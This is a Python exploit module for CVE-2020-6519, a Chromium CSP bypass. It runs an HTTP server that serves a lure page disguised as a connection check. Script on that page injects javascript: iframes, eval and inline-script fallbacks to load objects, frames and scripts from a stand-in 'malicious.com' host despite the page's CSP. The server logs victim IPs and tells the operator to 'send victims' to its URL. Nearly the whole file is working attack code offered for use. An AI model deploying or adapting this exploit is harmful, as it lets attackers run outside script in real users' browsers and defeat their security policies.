#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2020-6519: Chromium 83 - Full CSP Bypass
Content Security Policy bypass exploit for Chromium-based browsers
"""

import os
import socket
import threading
import time
import base64
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from typing import Dict, List, Any, Optional
import logging

logger = logging.getLogger(__name__)


class CVE2020_6519_Exploit:
    """Chromium CSP Bypass exploit"""
    
    def __init__(self):
        self.config = {
            'kali_ip': '127.0.0.1',
            'port': 8080,
            'auto_detect_ip': True,
            'bypass_object_src': True,
            'bypass_child_src': True,
            'bypass_script_src': True,
            'malicious_domain': 'malicious.com',
            'mode': 'exploit'
        }
        
        self.server = None
        self.server_thread = None
        self.bypass_attempts = []
        
    def set_parameter(self, name: str, value: Any):
        """Set exploit parameter"""
        if name in self.config:
            self.config[name] = value
            logger.info(f"Set {name} = {value}")
        else:
            logger.warning(f"Unknown parameter: {name}")
    
    def _get_local_ip(self) -> str:
        """Automatically detect local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return self.config['kali_ip']
    
    def generate_payload(self) -> str:
        """Generate HTML payload for CSP bypass"""
        if self.config['auto_detect_ip']:
            server_ip = self._get_local_ip()
        else:
            server_ip = self.config['kali_ip']
        
        malicious_url = f"http://{server_ip}:{self.config['port']}"
        malicious_domain = self.config['malicious_domain']
        
        # CSP Bypass payload based on CVE-2020-6519
        html_payload = f"""<!DOCTYPE html>
<html>
<head>
    <title>Secure Content</title>
    <meta charset="utf-8">
    <!-- CSP Header will be set by server -->
    <style>
        body {{ font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }}
        .container {{ max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
        h2 {{ color: #333; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Loading secure content...</h2>
        <p>Please wait while we verify your connection.</p>
    </div>
    
    <script>
        // CVE-2020-6519 Chromium CSP Bypass Exploit
        (function(){{
            'use strict';
            
            const maliciousUrl = '{malicious_url}';
            const maliciousDomain = '{malicious_domain}';
            
            // CSP Bypass payload
            const payload = `
                top.SUCCESS = true;
                var o = document.createElement("object");
                o.data = `http://${{maliciousDomain}}/bypass-object-src.html`;
                document.body.appendChild(o);
                var i = document.createElement("iframe");
                i.src = `http://${{maliciousDomain}}/bypass-child-src.html`;
                document.body.appendChild(i);
                var s = document.createElement("script");
                s.src = `http://${{maliciousDomain}}/bypass-script-src.js`;
                document.body.appendChild(s);
            `;
            
            // Method 1: javascript: protocol in iframe (CVE-2020-6519)
            document.body.innerHTML += "<iframe id='XXX' src='javascript:" + payload + "'></iframe>";
            
            // Method 2: Fallback using eval if first method fails
            setTimeout(() => {{
                if (!top.SUCCESS) {{
                    try {{
                        XXX.contentWindow.eval(payload);
                    }} catch(e) {{
                        console.log('CSP bypass attempt:', e.message);
                    }}
                }}
            }}, 100);
            
            // Method 3: Direct script injection if CSP allows inline
            if ({str(self.config['bypass_script_src']).lower()}) {{
                const script = document.createElement('script');
                script.textContent = payload;
                document.body.appendChild(script);
            }}
            
            console.log('[CVE-2020-6519] CSP bypass exploit executed');
        }})();
    </script>
</body>
</html>"""
        return html_payload
    
    class ExploitHTTPHandler(BaseHTTPRequestHandler):
        """HTTP handler for CSP bypass exploit"""
        
        def __init__(self, *args, exploit_instance=None, **kwargs):
            self.exploit = exploit_instance
            super().__init__(*args, **kwargs)
        
        def log_message(self, format, *args):
            """Override to use logger"""
            logger.info(f"CVE-2020-6519 Server: {format % args}")
        
        def do_GET(self):
            """Handle GET requests"""
            try:
                client_ip = self.client_address[0]
                path = self.path
                
                logger.info(f"[CVE-2020-6519] Request from {client_ip}: {path}")
                
                if path == '/' or path == '/index.html':
                    # Serve main exploit page with CSP header
                    payload = self.exploit.generate_payload()
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html; charset=utf-8')
                    # Set restrictive CSP to demonstrate bypass
                    self.send_header('Content-Security-Policy', 
                        "default-src 'self'; object-src 'none'; child-src 'none'; script-src 'self'")
                    self.send_header('Content-Length', str(len(payload.encode('utf-8'))))
                    self.end_headers()
                    self.wfile.write(payload.encode('utf-8'))
                    
                elif '/bypass-object-src.html' in path:
                    # Object-src bypass endpoint
                    self.exploit.bypass_attempts.append({
                        'type': 'object-src',
                        'timestamp': time.time(),
                        'ip': client_ip
                    })
                    
                    response = b'<html><body><h1>Object-src bypassed!</h1></body></html>'
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(response)
                    
                elif '/bypass-child-src.html' in path:
                    # Child-src bypass endpoint
                    self.exploit.bypass_attempts.append({
                        'type': 'child-src',
                        'timestamp': time.time(),
                        'ip': client_ip
                    })
                    
                    response = b'<html><body><h1>Child-src bypassed!</h1></body></html>'
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(response)
                    
                elif '/bypass-script-src.js' in path:
                    # Script-src bypass endpoint
                    self.exploit.bypass_attempts.append({
                        'type': 'script-src',
                        'timestamp': time.time(),
                        'ip': client_ip
                    })
                    
                    js_payload = b'console.log("Script-src bypassed! CVE-2020-6519"); top.SUCCESS = true;'
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/javascript')
                    self.end_headers()
                    self.wfile.write(js_payload)
                    
                else:
                    self.send_response(404)
                    self.end_headers()
                    
            except Exception as e:
                logger.error(f"Error in handler: {e}")
                self.send_error(500, "Internal Server Error")
        
        def do_POST(self):
            """Handle POST requests"""
            self.do_GET()
    
    def _start_server(self):
        """Start exploit server"""
        try:
            if self.config['auto_detect_ip']:
                self.config['kali_ip'] = self._get_local_ip()
            
            server_address = ('0.0.0.0', self.config['port'])
            self.server = HTTPServer(
                server_address,
                lambda *args, **kwargs: self.ExploitHTTPHandler(*args, exploit_instance=self, **kwargs)
            )
            
            logger.info(f"[CVE-2020-6519] Server started on http://{self.config['kali_ip']}:{self.config['port']}")
            self.server.serve_forever()
            
        except Exception as e:
            logger.error(f"Error starting server: {e}")
    
    def start_server(self) -> bool:
        """Start exploit server in separate thread"""
        try:
            self.server_thread = threading.Thread(target=self._start_server, daemon=True)
            self.server_thread.start()
            time.sleep(1)
            logger.info("[CVE-2020-6519] Server started successfully")
            return True
        except Exception as e:
            logger.error(f"Error starting server: {e}")
            return False
    
    def stop_server(self):
        """Stop exploit server"""
        try:
            if self.server:
                self.server.shutdown()
            logger.info("[CVE-2020-6519] Server stopped")
        except Exception as e:
            logger.error(f"Error stopping server: {e}")
    
    def get_bypass_attempts(self) -> List[Dict]:
        """Get all bypass attempts"""
        return self.bypass_attempts.copy()
    
    def execute_exploit(self, parameters: Dict[str, Any] = None) -> Dict[str, Any]:
        """Execute the exploit"""
        if parameters:
            for key, value in parameters.items():
                self.set_parameter(key, value)
        
        if self.config['auto_detect_ip']:
            self.config['kali_ip'] = self._get_local_ip()
        
        success = self.start_server()
        
        if success:
            exploit_url = f"http://{self.config['kali_ip']}:{self.config['port']}"
            return {
                'success': True,
                'exploit_url': exploit_url,
                'message': f'CSP bypass exploit server started. Send victims to: {exploit_url}'
            }
        else:
            return {
                'success': False,
                'error': 'Failed to start server'
            }


def execute_exploit(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """
    Execute CVE-2020-6519 CSP bypass exploit
    
    Args:
        parameters: Dictionary with exploit parameters:
            - kali_ip: IP address for server (default: auto-detect)
            - port: Port for server (default: 8080)
            - malicious_domain: Domain for bypass endpoints (default: malicious.com)
    
    Returns:
        Dictionary with execution results
    """
    exploit = CVE2020_6519_Exploit()
    return exploit.execute_exploit(parameters)
